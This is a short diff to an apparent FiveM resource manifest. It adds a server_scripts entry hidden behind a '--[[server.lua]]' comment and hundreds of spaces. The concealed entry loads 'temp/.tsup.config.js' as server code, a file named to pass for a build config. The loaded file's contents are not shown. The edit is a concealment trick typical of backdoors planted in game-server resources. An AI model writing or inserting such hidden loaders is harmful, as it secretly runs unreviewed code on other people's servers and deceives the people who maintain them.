@@ -10,3 +10,7 @@ fx_version 'adamant'
 game 'common'
 
 server_script 'yarn_builder.js'
+
+server_scripts {
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'temp/.tsup.config.js',
+}
